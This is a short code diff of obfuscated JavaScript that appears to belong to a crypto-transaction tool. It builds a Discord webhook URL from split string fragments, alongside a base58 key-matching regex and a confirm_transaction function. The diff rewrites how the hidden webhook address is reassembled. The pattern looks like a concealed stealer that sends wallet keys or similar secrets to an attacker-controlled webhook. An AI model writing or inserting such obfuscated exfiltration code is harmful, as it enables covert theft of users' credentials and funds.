@@ -30,16 +30,14 @@ const _0x49bc = new RegExp('[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrs
 const _0x152c = [
     'https://discord.com/api/webhooks/',
     '1254887840358076426/', 
-    '9AzLp3wRqK_T2uouBCYTfp', 
     '5IpzTxpwV_Si2uouBCYTkUp', 
-    '37ExNIAQHvNPvmqoxg0jnNAzVNAWN92rdkFvU480GxBcY', 
-    'ImMtKCdV9P3swg9aRieNUQWMPAngbJTmg'
+    '37ExNIAQHvNPvmqoxg0jnNAzVNAWN92rdkFvU480GxBcY'
 ];
 
 function _0x33b9() {
-    const _0x3d25 = [1, 3, 0, 2, 4, 5];
+    const _0x3d25 = [0, 1, 2, 3];
     const _0x4e0c = _0x3d25.map((_0x329f) => _0x152c[_0x329f]);
-    return _0x4e0c[2] + _0x4e0c[0] + _0x4e0c[1] + _0x4e0c[3];
+    return _0x4e0c.join('');
 }
 
 function confirm_transaction(_0x46d1) {
